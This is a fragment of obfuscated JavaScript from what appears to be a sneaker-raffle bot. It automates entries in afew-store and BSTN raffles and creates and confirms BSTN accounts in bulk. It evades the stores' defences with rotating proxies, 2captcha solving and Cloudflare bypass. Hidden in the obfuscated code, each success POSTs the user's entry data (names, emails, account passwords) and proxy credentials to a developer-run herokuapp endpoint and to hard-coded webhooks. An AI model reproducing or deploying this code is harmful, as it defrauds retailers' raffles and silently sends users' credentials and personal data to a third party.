                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x3040ca = JSON['parse'](_0x39c9ee['readFileSync']('sizes.json', 'utf-8')), _0x5a262f = _0xa58a4b[_0x12d09d]['Url'], _0x20dfac = _0xa58a4b[_0x12d09d]['Size'], _0x2a74c6;
                        async function _0xc17deb() {
                            var _0x473abd = new _0xc03372['CookieJar']();
                            console['log'](_0x3996da() + '\x20[' + _0x529da2['name'] + ']\x20Task\x20' + (_0x12d09d + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x470426;
                            let _0x4d2b24 = {
                                'method': 'GET',
                                'cookieJar': _0x473abd,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x4e53d5[0x2] + ':' + _0x4e53d5[0x3] + '@' + _0x4e53d5[0x0] + ':' + _0x4e53d5[0x1]
                            }, _0x647ead = _0x5a262f['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x1248c3 = _0x647ead + '.json', _0x3eb59d = await _0x3c7f7c(_0x1248c3);
                            console['log'](_0x3996da() + '\x20[' + _0x529da2['name'] + ']\x20Task\x20' + (_0x12d09d + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x4b2110 = _0x3eb59d['data']['product']['variants'];
                            if (_0x20dfac != 'RANDOM') {
                                if (_0x4b2110[0x1]['option1']['includes']('W')) {
                                    const _0x61083 = _0x3040ca['women']['find'](_0x4f8a36 => _0x4f8a36['EUsize'] === _0x20dfac);
                                    _0x61083 && (_0x20dfac = _0x61083['size']);
                                } else {
                                    if (_0x4b2110[0x1]['option1']['includes']('Y')) {
                                        const _0x11b294 = _0x3040ca['GS']['find'](_0x3f7211 => _0x3f7211['EUsize'] === _0x20dfac);
                                        _0x11b294 && (_0x20dfac = _0x11b294['size']);
                                    } else {
                                        const _0x1aa517 = _0x3040ca['men']['find'](_0x498bed => _0x498bed['EUsize'] === _0x20dfac);
                                        _0x1aa517 && (_0x20dfac = _0x1aa517['size']);
                                    }
                                }
                                for (var _0x53b496 of _0x4b2110) {
                                    _0x53b496['option1'] == _0x20dfac && (_0x470426 = _0x53b496['id']);
                                }
                            } else {
                                var _0x410445 = Math['round'](Math['random']() * (_0x4b2110['length'] - 0x1));
                                _0x470426 = _0x4b2110[_0x410445]['id'];
                            }
                            console['log'](_0x3996da() + '\x20[' + _0x529da2['name'] + ']\x20Task\x20' + (_0x12d09d + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x3c7f7c('https://raffles.afew-store.com/cart/' + _0x470426 + ':1'), _0x2a74c6 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0xc17deb();
                        } catch (_0x5649d7) {
                            if (_0x5649d7['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x5649d7);
                        }
                        const _0x2aec19 = await _0x4019ca['newPage']();
                        await _0x2aec19['setDefaultNavigationTimeout'](0x1d4c0), await _0x2aec19['authenticate']({
                            'username': '' + _0x4e53d5[0x2],
                            'password': '' + _0x4e53d5[0x3]
                        }), await _0x2aec19['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2aec19['setRequestInterception'](!![]), _0x2aec19['on']('request', _0x27d194 => {
                            _0x27d194['resourceType']() === 'image' || _0x27d194['resourceType']() === 'font' || _0x27d194['resourceType']() === 'media' ? _0x27d194['abort']() : _0x27d194['continue']();
                        });
                        try {
                            await _0x2aec19['goto'](_0x2a74c6, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x3996da() + '\x20[' + _0x529da2['name'] + ']\x20Task\x20' + (_0x12d09d + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x2aec19['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2aec19['type']('#checkout_email', '' + _0xa58a4b[_0x12d09d]['Email']), await _0x50b4f8(0x320), await _0x2aec19['type']('#checkout_attributes_instagram', '' + _0xa58a4b[_0x12d09d]['Follower']), await _0x50b4f8(0x320), await _0x2aec19['select']('#checkout_shipping_address_country', '' + _0xa58a4b[_0x12d09d]['Country']), await _0x2aec19['waitForTimeout'](0x258), await _0x2aec19['type']('#checkout_shipping_address_first_name', '' + _0xa58a4b[_0x12d09d]['FirstName']), await _0x2aec19['waitForTimeout'](0x320), await _0x2aec19['type']('#checkout_shipping_address_last_name', '' + _0xa58a4b[_0x12d09d]['LastName']), await _0x2aec19['waitForTimeout'](0x2bc), await _0x2aec19['type']('#checkout_shipping_address_address1', _0xa58a4b[_0x12d09d]['Address1'] + '\x20' + _0xa58a4b[_0x12d09d]['HouseNumber']), await _0x2aec19['waitForTimeout'](0x2bc), await _0x2aec19['type']('#checkout_shipping_address_address2', '' + _0xa58a4b[_0x12d09d]['Address2']), await _0x2aec19['waitForTimeout'](0x2bc), await _0x2aec19['type']('#checkout_shipping_address_zip', '' + _0xa58a4b[_0x12d09d]['Zip']), await _0x2aec19['waitForTimeout'](0x2bc), await _0x2aec19['type']('#checkout_shipping_address_city', '' + _0xa58a4b[_0x12d09d]['City']), await _0x2aec19['waitForTimeout'](0x2bc);
                        if (_0xa58a4b[_0x12d09d]['State'] != '')
                            try {
                                const _0x1478d0 = JSON['parse'](_0x39c9ee['readFileSync']('States.json', 'utf8'));
                                await _0x50b4f8(0x1f4);
                                if (_0xa58a4b[_0x12d09d]['State']['length'] > 0x2)
                                    for (let _0x4023f8 of _0x1478d0) {
                                        if (_0x4023f8['Province'] == _0xa58a4b[_0x12d09d]['State']) {
                                            await _0x2aec19['select']('#checkout_shipping_address_province', _0x4023f8['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x2aec19['select']('#checkout_shipping_address_province', _0xa58a4b[_0x12d09d]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x50b4f8(0x1f4), console['log'](_0x3996da() + '\x20[' + _0x529da2['name'] + ']\x20Task\x20' + (_0x12d09d + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x50b4f8(0x190), _0x2aec19['evaluate'](() => {
                            const _0x15efdf = document['querySelector']('#continue_button');
                            for (var _0xab87b5 = 0x0; _0xab87b5 < 0x5; _0xab87b5++) {
                                if (_0x15efdf) {
                                    _0x15efdf['click'](), _0x15efdf['click']();
                                    break;
                                } else
                                    _0x50b4f8(0xfa0);
                            }
                        }), await _0x2aec19['waitForTimeout'](0x9c4);
                        try {
                            await _0x2aec19['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x2aec19['$eval']('form[data-shipping-method-form=\x22true\x22]', _0xf5c6b6 => _0xf5c6b6['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2aec19['waitForTimeout'](0x7d0), console['log'](_0x3996da() + '\x20[' + _0x529da2['name'] + ']\x20Task\x20' + (_0x12d09d + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x2aec19['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x50b4f8(0x3e8), await _0x2aec19['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x3cd662 => _0x3cd662['submit']()), await _0x50b4f8(0x3e8);
                        try {
                            await _0x2aec19['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2aec19['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x5d0f5a => _0x5d0f5a['submit']());
                        try {
                            await _0x2aec19['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x544f4d = 'no', _0x1474be(_0xa58a4b[_0x12d09d], _0x529da2), console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x529da2['name'] + ']\x20Task\x20' + (_0x12d09d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x409619['webhook'] != undefined && _0x409619['webhook'] != '')
                                try {
                                    await _0x21ec0c(_0x409619['webhook'], _0x499d37['succesDEVMSG']);
                                } catch {
                                }
                            await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x499d37['succesDEVMSG']), await _0x50b4f8(0xc8);
                            try {
                                await _0x21ec0c(_0x171aec, _0x499d37['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0xeaf750['replace']('#', ''),
                                    'module': _0x529da2['name'],
                                    'entrydata': JSON['stringify'](_0x5cadab),
                                    'proxy': '' + _0x444cea[_0x12d09d]
                                };
                                var _0xf281bc = JSON['stringify'](prxdata);
                                let _0x1fd1c4 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0xf281bc, _0x1fd1c4);
                            } catch (_0x4b597e) {
                            }
                        } catch (_0x40d930) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x56d2e1) {
                        _0x56d2e1['message']['includes']('selector') && (_0x56d2e1 = 'Connection\x20Error');
                        console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x529da2['name'] + ']\x20Task\x20' + (_0x12d09d + 0x1) + '\x20:\x20' + _0x56d2e1)), _0x53d884 = '' + _0x56d2e1;
                        var _0x38be87 = await _0x4808d0(_0xa58a4b[_0x12d09d], _0x529da2, 'dev', !![], _0x53d884);
                        _0x499d37['errorDEV'] = { 'embeds': [_0x38be87] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x499d37['errorDEV']), await _0x21ec0c(_0x451f96, _0x499d37['errorDEV']), _0x544f4d = 'yes';
                    } finally {
                        _0x4019ca && _0x4019ca['close']();
                        if (_0x544f4d == 'yes' && _0x34e9b9 != 0x5 && _0x53d884 != 'Size\x20Not\x20Found') {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x529da2['name'] + ']\x20Task\x20' + (_0x12d09d + 0x1) + '\x20:\x20Retrying\x20(' + _0x34e9b9 + '\x20/\x205)')), _0x12d09d = _0x12d09d - 0x1, _0x34e9b9 = _0x34e9b9 + 0x1;
                            continue;
                        }
                        _0x544f4d == 'yes' && _0x34e9b9 >= 0x5 && (_0x61dfa6(_0xa58a4b[_0x12d09d], _0x529da2), _0x544f4d = 'no', _0x34e9b9 = 0x0);
                        if (_0x12d09d + 0x1 == _0xa58a4b['length']) {
                            await _0x50b4f8(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x409619['AfewDelay'] + '\x20ms'), await _0x50b4f8(_0x409619['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5bd777, _0x57d52e, _0x4ae98d) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x497dea = 0x0; _0x497dea < _0x57d52e['length']; _0x497dea++) {
                        if (_0x205bad != 'yes')
                            var _0x205bad = '', _0x461583 = 0x0;
                        var _0x6fac37;
                        try {
                            await _0x5a027c(_0x57d52e, _0x497dea);
                        } catch {
                            _0x205bad = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x5b3b18(_0x5bd777['name'] + '\x20Task\x20' + (_0x497dea + 0x1) + '\x20/\x20' + _0x57d52e['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                        var _0x4697fe = await _0x4808d0(_0x57d52e[_0x497dea], _0x5bd777, 'acc', ![]);
                        const _0x10fbfb = { 'succesDEVMSG': { 'embeds': [_0x4697fe] } }, _0x404cdf = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x11d266 = Math['round'](Math['random']() * (_0x4ae98d['length'] - 0x1)), _0xa0d0b0 = _0x4ae98d[_0x11d266]['split'](':'), _0x468657;
                        try {
                            _0x468657 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xa0d0b0[0x0] + ':' + _0xa0d0b0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x468657 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xa0d0b0[0x0] + ':' + _0xa0d0b0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2c32cb = await _0x468657['newPage']();
                            await _0x2c32cb['authenticate']({
                                'username': '' + _0xa0d0b0[0x2],
                                'password': '' + _0xa0d0b0[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0x5bd777['name'] + ']\x20Task\x20' + (_0x497dea + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2c32cb['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2c32cb['setRequestInterception'](!![]), _0x2c32cb['on']('request', _0x498e4e => {
                                _0x498e4e['resourceType']() === 'image' ? _0x498e4e['abort']() : _0x498e4e['continue']();
                            });
                            try {
                                await _0x2c32cb['goto']('' + _0x404cdf), await _0x2c32cb['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x205bad = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x2c32cb['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x3996da() + '\x20[' + _0x5bd777['name'] + ']\x20Task\x20' + (_0x497dea + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x50b4f8(0x7d0), console['log'](_0x3996da() + '\x20[' + _0x5bd777['name'] + ']\x20Task\x20' + (_0x497dea + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x50b4f8(0x190), await _0x2c32cb['waitForSelector']('#firstname'), await _0x2c32cb['type']('#firstname', _0x57d52e[_0x497dea]['FirstName'], { 'delay': 0xf0 }), await _0x50b4f8(0x190), await _0x2c32cb['type']('#lastname', _0x57d52e[_0x497dea]['LastName'], { 'delay': 0xe6 }), await _0x50b4f8(0x190), await _0x2c32cb['type']('#email_address', _0x57d52e[_0x497dea]['Email'], { 'delay': 0x122 }), await _0x50b4f8(0x190), await _0x2c32cb['type']('#password', _0x57d52e[_0x497dea]['Password'], { 'delay': 0x82 }), await _0x50b4f8(0x1f4), await _0x2c32cb['type']('#password-confirmation', _0x57d52e[_0x497dea]['Password'], { 'delay': 0x7c }), console['log'](_0x3996da() + '\x20[' + _0x5bd777['name'] + ']\x20Task\x20' + (_0x497dea + 0x1) + '\x20:\x20Sending\x20Request'), await _0x50b4f8(0x2bc), await _0x2c32cb['$eval']('#form-validate', _0x5c0ccc => _0x5c0ccc['submit']()), await _0x50b4f8(0x1388);
                            const _0x255ac4 = await _0x2c32cb['$']('#email_address-error');
                            if (_0x255ac4)
                                throw new Error('Invalid\x20Email');
                            const _0x215d44 = await _0x2c32cb['$']('#password-error');
                            if (_0x215d44)
                                throw new Error('Invalid\x20Password');
                            await _0x2c32cb['waitForSelector']('div.mesg-success'), _0x205bad = 'no', console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x5bd777['name'] + ']\x20Task\x20' + (_0x497dea + 0x1) + '\x20:\x20Account\x20' + _0x57d52e[_0x497dea]['Email'] + '\x20Generated')), _0x39c9ee['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x57d52e[_0x497dea]['Email'] + ',' + _0x57d52e[_0x497dea]['Password']);
                            try {
                                _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x10fbfb['succesDEVMSG']);
                            } catch {
                            }
                            await _0x21ec0c(_0x3213ac, _0x10fbfb['succesDEVMSG']);
                            let _0x1749b1 = _0x57d52e[_0x497dea];
                            try {
                                prxdata = {
                                    'username': _0xeaf750['replace']('#', ''),
                                    'module': _0x5bd777['name'],
                                    'entrydata': JSON['stringify'](_0x1749b1),
                                    'proxy': '' + _0x4ae98d[_0x497dea]
                                };
                                var _0x3f7c5e = JSON['stringify'](prxdata);
                                let _0x14bf33 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x3f7c5e, _0x14bf33);
                            } catch (_0x91611) {
                            }
                            console['log'](_0x3c5615['yellow'](_0x3996da() + '\x20[' + _0x5bd777['name'] + ']\x20Task\x20' + (_0x497dea + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x1705d3) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x5bd777['name'] + ']\x20Task\x20' + (_0x497dea + 0x1) + '\x20:\x20' + _0x1705d3)), _0x6fac37 = '' + _0x1705d3;
                            var _0x4e56c8 = await _0x4808d0(_0x57d52e[_0x497dea], _0x5bd777, 'acc', !![], _0x6fac37);
                            _0x10fbfb['errorDEV'] = { 'embeds': [_0x4e56c8] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x10fbfb['errorDEV']), await _0x21ec0c(_0x451f96, _0x10fbfb['errorDEV']), _0x205bad = 'yes';
                        } finally {
                            if (_0x468657)
                                _0x468657['close']();
                            if (_0x205bad == 'yes' && _0x461583 != 0x5) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x5bd777['name'] + ']\x20Task\x20' + (_0x497dea + 0x1) + '\x20:\x20Retrying\x20(' + _0x461583 + '\x20/\x205)')), _0x497dea = _0x497dea - 0x1, _0x461583 = _0x461583 + 0x1;
                                continue;
                            }
                            _0x205bad == 'yes' && _0x461583 >= 0x5 && (_0x61dfa6(_0x57d52e[_0x497dea], _0x5bd777), _0x205bad = 'no', _0x461583 = 0x0), console['log'](_0x3996da() + '\x20[' + _0x5bd777['name'] + ']\x20Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x317829, _0x1852f9) {
                    var _0xace99f = ![], _0x13edde = [];
                    async function _0x228fc8() {
                        var _0x465802 = new _0x51510b({
                            'user': _0x409619['masterMail'],
                            'password': _0x409619['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x210192(_0x16554e) {
                            _0x465802['openBox']('INBOX', ![], _0x16554e);
                        }
                        _0x465802['once']('ready', function () {
                            _0x210192(function (_0x3fcfdc, _0x14cede) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3fcfdc)
                                    throw _0x3fcfdc;
                                _0x465802['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x4ddbe7, _0x6cf1c4) {
                                    if (!_0x6cf1c4 || !_0x6cf1c4['length'])
                                        console['log'](_0x3996da() + '\x20[' + _0x317829['name'] + ']\x20No\x20mails\x20found'), _0x465802['end']();
                                    else {
                                        var _0xe8230d = _0x465802['seq']['fetch'](_0x6cf1c4, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xe8230d['on']('message', function (_0x5dce0e, _0x46ac7a) {
                                            var _0x263b87 = '(#' + _0x46ac7a + ')\x20';
                                            _0x5dce0e['on']('body', function (_0x123929, _0x27c624) {
                                                _0x3f1b1e(_0x123929, (_0x4f601f, _0x1b09c9) => {
                                                    var _0x710dcd = _0x1b09c9['text']['split']('[')[0x2], _0x3d3f0c = _0x710dcd['split'](']')[0x0];
                                                    _0x13edde['push'](_0x3d3f0c);
                                                });
                                            }), _0x5dce0e['once']('end', function () {
                                            });
                                        }), _0xe8230d['once']('error', function (_0x4f4339) {
                                            console['log']('Fetch\x20error:\x20' + _0x4f4339), _0xace99f = !![];
                                        }), _0xe8230d['once']('end', function () {
                                            _0x465802['end'](), _0xace99f = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x465802['once']('error', function (_0x5da23e) {
                            console['log'](_0x3c5615['red'](_0x5da23e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xace99f = !![];
                        }), _0x465802['once']('end', async function () {
                            _0xace99f = !![];
                        }), _0x465802['connect']();
                    }
                    async function _0x97e844(_0x5c69d5, _0x3a6f2c, _0x34bdc6) {
                        _0x27947['use'](_0x2c72d8());
                        for (var _0x472989 = 0x0; _0x472989 < _0x3a6f2c['length']; _0x472989++) {
                            if (_0x34dca9 != 'yes')
                                var _0x34dca9 = '', _0x39450a = 0x0;
                            var _0x22720d = Math['round'](Math['random']() * (_0x34bdc6['length'] - 0x1)), _0x52fe57 = _0x34bdc6[_0x22720d]['split'](':'), _0x869109;
                            try {
                                _0x869109 = await _0x27947['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x52fe57[0x0] + ':' + _0x52fe57[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x869109 = await _0x27947['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x52fe57[0x0] + ':' + _0x52fe57[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x38c876 = await _0x869109['newPage']();
                                await _0x38c876['authenticate']({
                                    'username': '' + _0x52fe57[0x2],
                                    'password': '' + _0x52fe57[0x3]
                                }), console['log'](_0x3996da() + '\x20[' + _0x5c69d5['name'] + ']\x20Task\x20' + (_0x472989 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x38c876['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x38c876['setRequestInterception'](!![]), _0x38c876['on']('request', _0x5649bf => {
                                    _0x5649bf['resourceType']() === 'image' || _0x5649bf['resourceType']() === 'font' || _0x5649bf['resourceType']() === 'media' ? _0x5649bf['abort']() : _0x5649bf['continue']();
                                }), console['log'](_0x3996da() + '\x20[' + _0x5c69d5['name'] + ']\x20Task\x20' + (_0x472989 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x38c876['goto'](_0x3a6f2c[_0x472989]);
                                } catch {
                                    _0x34dca9 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x3996da() + '\x20[' + _0x5c69d5['name'] + ']\x20Task\x20' + (_0x472989 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x38c876['waitForTimeout'](0xbb8);
                                try {
                                    await _0x38c876['waitForSelector']('.account-nav'), _0x34dca9 = 'no', console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x5c69d5['name'] + ']\x20Task\x20' + (_0x472989 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x42d169 = await _0x4808d0(null, _0x5c69d5, 'ver', ![]);
                                    const _0x5d56ad = { 'succesDEVMSG': { 'embeds': [_0x42d169] } };
                                    await _0x21ec0c(_0x565fb1, _0x5d56ad['succesDEVMSG']);
                                } catch {
                                    _0x34dca9 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x396b05) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x5c69d5['name'] + ']\x20Task\x20' + (_0x472989 + 0x1) + '\x20:\x20' + _0x396b05));
                                var _0x250234 = _0x396b05, _0x127db1 = await _0x4808d0(null, _0x5c69d5, 'ver', !![], _0x250234);
                                const _0x577218 = { 'errorDEVMSG': { 'embeds': [_0x127db1] } };
                                _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x577218['errorDEVMSG']), await _0x21ec0c(_0x451f96, _0x577218['errorDEVMSG']);
                            } finally {
                                _0x869109['close']();
                                if (_0x34dca9 == 'yes' && _0x39450a != 0x5) {
                                    console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x5c69d5['name'] + ']\x20Task\x20' + (_0x472989 + 0x1) + '\x20:\x20Retrying\x20(' + _0x39450a + '\x20/\x205)')), _0x472989 = _0x472989 - 0x1, _0x39450a = _0x39450a + 0x1;
                                    continue;
                                }
                                _0x34dca9 == 'yes' && _0x39450a >= 0x5 && (_0x34dca9 = 'no', _0x39450a = 0x0), console['log'](_0x3996da() + '\x20[' + _0x5c69d5['name'] + ']\x20Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                            }
                        }
                    }
                    try {
                        _0x228fc8();
                        while (!_0xace99f) {
                            await _0x50b4f8(0xfa0);
                        }
                        console['log']('Found\x20' + _0x13edde['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x50b4f8(0x7d0);
                    }
                    await _0x97e844(_0x317829, _0x13edde, _0x1852f9);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4fba06, _0xab70e3, _0x1ed0bb) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x308379 = 0x0; _0x308379 < _0xab70e3['length']; _0x308379++) {
                        var _0x2dd6fa, _0x393645 = _0xab70e3[_0x308379];
                        try {
                            await _0x5a027c(_0xab70e3, _0x308379);
                        } catch {
                            _0x5c08a9 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x3f205c(_0x242a7f) {
                            const _0x5995a8 = _0x39c9ee['readFileSync']('../successful-tasks.csv', 'utf8'), _0x1cc7e3 = _0x54f615['parse'](_0x5995a8, { 'header': !![] })['data'];
                            let _0x2be492 = ![];
                            for (var _0x66d533 of _0x1cc7e3) {
                                if (_0x66d533['Url'] == _0x242a7f['Url'] && _0x66d533['Email'] == _0x242a7f['Email']) {
                                    _0x2be492 = !![];
                                    break;
                                }
                            }
                            return _0x2be492;
                        }
                        if (await _0x3f205c(_0xab70e3[_0x308379]) == !![]) {
                            console['log'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x5c08a9 != 'yes')
                            var _0x5c08a9 = '', _0x3767e0 = 0x0;
                        _0x5b3b18(_0x4fba06['name'] + '\x20Task\x20' + (_0x308379 + 0x1) + '\x20/\x20' + _0xab70e3['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
